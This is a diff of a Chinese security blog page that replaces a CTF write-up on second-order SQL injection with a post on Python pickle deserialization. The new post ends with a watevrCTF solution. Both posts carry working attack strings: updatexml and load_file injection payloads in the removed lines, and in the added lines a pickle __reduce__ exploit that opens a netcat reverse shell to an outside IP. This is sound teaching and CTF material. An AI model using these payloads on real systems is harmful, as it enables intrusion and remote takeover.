@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">[CISCN2019 华北赛区 Day1 Web5]CyberPunk | Troy3e</title>
+  <title itemprop="name">Python pickle 反序列化分析 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -346,11 +346,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094165.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094165.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1115212.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1115212.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      [CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1>
+      Python pickle 反序列化分析</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -362,7 +362,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-8-12<span class="bull">
+        2020-11-24<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -376,15 +376,65 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200812221432.jpg" alt=""></p>
-<p>查看源码在最后发现了提示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812221726.png" alt=""></p>
-<p>尝试用伪协议读取源码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812221936.png" alt=""></p>
-<p>用同样的方式读取其他各个页面的源码：</p>
-<p>以change.php为例：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812222859.png" alt=""></p>
-<p>可以看到对SQL注入做了比较严的过滤，但是，这过滤并没有针对address，address却只是进行了简单的转义。<br>之前留言板那道题已经遇到过一次了，看到这个addslashes果断想到二次注入。<br>利用updatexml：<br>先读前30位：1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,30)),0x7e),1)#<br>再读最后几位：1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),30,60)),0x7e),1)#<br>因为updatexml这个函数最多显示32位，所以要分两次读。</p>
+          <p>buu上遇到个python pickle反序列化的题，顺便学习一下有关知识。</p>
+<p>python反序列化简介与利用</p>
+<p>相较于php的反序列化，python的反序列化更容易利用，危害也更大。在php的反序列化漏洞利用中我们必须挖掘复杂的利用链，但python的序列化和反序列化中却不需要那么麻烦，因为python序列化出来的是pickle流，这是一种栈语言，python能够实现的功能它也能实现，引用一下pickle的简介：</p>
+<p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好,之后就以pickle库来进行演示。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124221718.png" alt=""></p>
+<p>先通过几个例子来看下这几个函数的作用：</p>
+<p>dump/load</p>
+<p>#序列化<br>pickle.dump(obj, file, protocol=None,)<br>obj表示要进行封装的对象(必填参数）<br>file表示obj要写入的文件对象<br>以二进制可写模式打开即wb(必填参数）<br>#反序列化<br>pickle.load(file, *, fix_imports=True, encoding=”ASCII”, errors=”strict”, buffers=None)<br>file文件中读取封存后的对象<br>以二进制可读模式打开即rb(必填参数)</p>
+<p>dumps/loads</p>
+<p>#序列化<br>pickle.dumps(obj, protocol=None,*,fix_imports=True)<br>dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。<br>#反序列化<br>pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”)<br>loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。</p>
+<p>python2</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124221317.png" alt=""></p>
+<p>在python下输出如下：<br>b’\x80\x03X\x04\x00\x00\x00abcdq\x00.’<br>python2序列化输出的字符串可以放在python3里正常反序列化，但python3序列化输出的字符串却不能让python2反序列化。</p>
+<p>不同pickle版本的操作码及其含义可以在python3的安装目录里搜索pickle.py查看，如下是一部分操作码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200301220031-0357b100-5bc5-1.png" alt=""></p>
+<p>对于上面python上的结果进行分析<br>b’\x80\x03X\x04\x00\x00\x00abcdq\x00.’：</p>
+<p>第一个字符\x80是一个操作码，pickle.py文件中的注释说明它的含义是用来声明pickle版本，后面跟着的\x03就代表了版本3；随后的X表示后面的四个字节代表了一个数字（小端序），即\x04\x00\x00\x00,值为4，表示下面跟着的utf8编码的字符串的长度，即后面跟着的abcd;再往后是q,这个没有查到详细的说明，看注释上的字面意思是后面即\x00是一个字节的参数，但也不知道这个有什么用，我猜测它是用来给参数做索引用的，索引存储在momo区，如果不需要用到取数据，可以把q\x00删掉，这并不影响反序列化，最后的.代表结束，这是每个pickle流末尾都会有的操作符。</p>
+<p>来看看复杂类型的数据序列化后是什么样的：</p>
+<pre><code>a=(&quot;item1&quot;,&quot;item2&quot;)
+b=[&quot;item1&quot;,&quot;item2&quot;]
+c={&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}
+print(pickle.dumps(a))
+print(pickle.dumps(b))
+print(pickle.dumps(c))</code></pre><p>结果：</p>
+<pre><code>b&#39;\x80\x03X\x05\x00\x00\x00item1q\x00X\x05\x00\x00\x00item2q\x01\x86q\x02.&#39;
+b&#39;\x80\x03]q\x00(X\x05\x00\x00\x00item1q\x01X\x05\x00\x00\x00item2q\x02e.&#39;
+b&#39;\x80\x03}q\x00(X\x04\x00\x00\x00key1q\x01X\x06\x00\x00\x00value1q\x02X\x04\x00\x00\x00key2q\x03X\x06\x00\x00\x00value2q\x04u.&#39;</code></pre><p>先来看tuple的pickle流，在栈上连续定义了两个字符串最后在结尾加了\x86这个操作码，其含义为”利用栈顶的两个元素（即前面的item1和item2）建立一个元组”，后面的q\x02标识该元组在memo的索引，最后是.结束符。</p>
+<p>再看list的pickle流，在版本声明的后面是一个]操作符，意思是在栈上建立一个空list，q\x00是这个列表在memo的索引，后面是一个(,这是一个很重要的操作符，它用来标记后面某个操作的参数的边界，在这里其实是用来告诉末尾的e（建立list的操作符），从(开始到e操作符前面的内容用来构建list，(标记前面的内容就不归e操作符管了。最后是.结束符。</p>
+<p>最后来看dict的pickle流，在版本声明的后面是一个},表示在栈上建立一个空dict，q\x00表明了这个dict在memo区的索引，后面同样是(标记,后面按照先key后value的属性依次定义数据，并给每个数据定好memo区的索引，最后是u操作符，类似于上面的e操作符，它的含义为利用(标记到u之间的数据构建dict，最后是.操作符。</p>
+<p>上面是python3情况下的分析，遇到python2的题可看此链接：<br><a href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a><br>或者直接看此图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201124225901.jpg" alt=""></p>
+<p>整个序列化的过程可以分为三个步骤</p>
+<p>从对象中提权所有属性<br>写入对象的所有模块名和类名<br>写入对象所有属性的键值对</p>
+<p>反序列化的过程就是序列化过程的逆过程。</p>
+<p>#Pickle/CPickle反序列化漏洞分析</p>
+<p>反序列化漏洞出现在 <strong>reduce</strong>()魔法函数上，这一点和PHP中的__wakeup()魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p>
+<p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p>
+<p>另外pickle.loads会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。</p>
+<p>#漏洞可能出现的位置：</p>
+<p>解析认证token、session的时候<br>将对象Pickle后存储成磁盘文件<br>将对象Pickle后在网络中传输<br>参数传递给程序</p>
+<p>命令执行的例子：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124230851.png" alt=""></p>
+<p>好了 下面开始解题</p>
+<p>[watevrCTF-2019]Pickle Store</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124233847.png" alt=""></p>
+<p>cookie里看到奇怪代码，使用pickle.loads()和base64对这串字符进行解码反序列化</p>
+<p>经过上面的学习，现在可谓是轻车熟路</p>
+<pre><code>import pickle
+import base64
+
+print(pickle.loads(base64.b64decode(&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;)))</code></pre><p>利用Pickle反序列化exp反弹shell</p>
+<pre><code>import pickle
+import base64
+
+class A(object):
+    def __reduce__(self):
+        return (eval, (&quot;__import__(&#39;os&#39;).system(&#39;nc 172.16.151.7 9999 -e/bin/sh&#39;)&quot;,))
+a = A()
+print(base64.b64encode(pickle.dumps(a)))</code></pre><p>参考链接：<br><a href="https://www.secshi.com/39791.html">https://www.secshi.com/39791.html</a><br><a href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a><br><a href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -413,36 +463,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/08/13/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1095248.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1095248.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                [GKCTF2020]EZ三剑客-EzWeb</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/08/12/HITCON-2017-SSRFme/" rel="next">
+            <a href="/2020/11/23/HECTF2020-Web/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094203.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094203.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [HITCON 2017]SSRFme</h3>
+                HECTF2020-Web</h3>
                 <hr>
               </div>
             </a>
